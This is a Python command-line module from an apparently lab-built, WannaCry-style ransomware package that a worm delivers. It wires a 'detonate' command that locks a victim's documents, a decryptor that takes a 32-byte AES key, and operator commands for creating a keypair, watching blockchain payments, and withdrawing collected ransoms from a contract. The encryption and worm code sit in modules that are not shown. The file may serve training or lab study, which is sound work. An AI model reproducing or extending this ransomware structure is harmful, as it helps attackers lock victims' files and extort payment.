"""`ransom`: the victim's menu on a locked machine, the operator's tools on theirs.

Nothing here is installed on a victim when the lab is built. The whole
package arrives with the worm, and the payload leaves the `ransom` command
behind.
"""

from pathlib import Path
import sys

from . import operator, paths, victim

HELP = """usage: ransom <command>

what the worm runs on each machine it reaches:
    ransom detonate         lock the documents and leave the menu (the payload's start command)

on a locked machine (what the worm leaves behind):
    ransom                  open the participant menu
    ransom decrypt          paste the granted key and get the documents back
    ransom status           one look at this machine

on the operator's machine:
    ransom init             create the operator's keypair (runs at boot)
    ransom watch            answer every paid request on the chain
    ransom withdraw         take the collected ransoms out of the contract
    ransom status           one look at this side
    ransom reply --request FILE    the manual path: turn a saved request into a reply"""


def is_operator() -> bool:
    return paths.OPERATOR.exists()


def decrypt(pasted=None) -> int:
    """The WannaCry-style manual decryptor: what it says, and what it refuses."""
    print("=" * 60)
    print("  WANNACRY LAB DECRYPTOR")
    print("  Paste the decryption key the attacker granted you.")
    print("=" * 60)

    import base64

    pasted = pasted or input("Paste your decryption key: ").strip()
    if not paths.KEYLOG.exists():
        raise SystemExit("nothing is locked on this machine")
    try:
        # strict: every character must be part of the key. A forgiving decoder
        # ignores everything after the final "=" and drops other characters, so a
        # key with junk added still decrypted, which looks like a fake decryptor.
        file_key = base64.b64decode(pasted.encode("ascii"), validate=True)
    except Exception:
        raise SystemExit("that is not valid base64; copy the key exactly as printed")
    if len(file_key) != 32:
        raise SystemExit(
            f"expected a 32-byte AES-256 key (got {len(file_key)} bytes); "
            "copy the full key exactly as printed"
        )
    return victim.restore(file_key)


def main(argv) -> int:
    command = argv[0] if argv else "menu"
    rest = argv[1:]

    if command == "menu":
        from .ui import run_interface

        run_interface()
        return 0

    if command == "detonate":
        # The worm runs this on arrival, from the folder it was unpacked in.
        victim.run(Path(__file__).resolve().parent.parent)
        return 0

    if command == "decrypt":
        key = rest[rest.index("--key") + 1] if "--key" in rest else None
        decrypt(key)
        return 0

    if command == "status":
        if is_operator():
            operator.status()
        else:
            victim.status()
        return 0

    if command in ("init", "watch", "withdraw", "reply"):
        return operator.main(argv)

    print(HELP)
    return 2


if __name__ == "__main__":
    try:
        sys.exit(main(sys.argv[1:]))
    except victim.ERRORS as error:
        print(f"ransom: {error}", file=sys.stderr)
        sys.exit(1)
